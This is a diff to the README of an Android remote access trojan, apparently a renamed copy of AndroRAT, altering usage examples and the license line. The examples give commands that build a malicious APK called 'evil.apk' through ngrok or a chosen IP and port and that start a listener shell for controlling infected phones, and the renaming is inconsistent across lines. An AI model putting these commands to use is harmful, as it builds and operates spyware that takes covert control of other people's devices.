@@ -133,13 +133,13 @@ In the sh shell there are some sub commands
 ## Examples
 
 * To build the apk using ngrok which will also set the listner:
-```python3 Hacker-Android-RAT.py --build --ngrok -o evil.apk```
+```python3 AndroRAT.py --build --ngrok -o evil.apk```
 
 * To build the apk using desired ip and port:
 ```python3 Hacker-Android-RAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
 
 * To get the interpreter:
-```python3 Hacker-Android-RAT.py --shell -i 0.0.0.0 -p 8000```
+```python3 AndroRAT.py --shell -i 0.0.0.0 -p 8000```
 
 ## Interpreter Examples
 * Generating APK
@@ -163,6 +163,6 @@ In the sh shell there are some sub commands
 
 
 ## License
-Saza-RAT is licensed under MIT license take a look at the [LICENSE](LICENSE) for more information.
+Hacker-ANDROID-RAT is licensed under MIT license take a look at the [LICENSE](LICENSE) for more information.
 
 
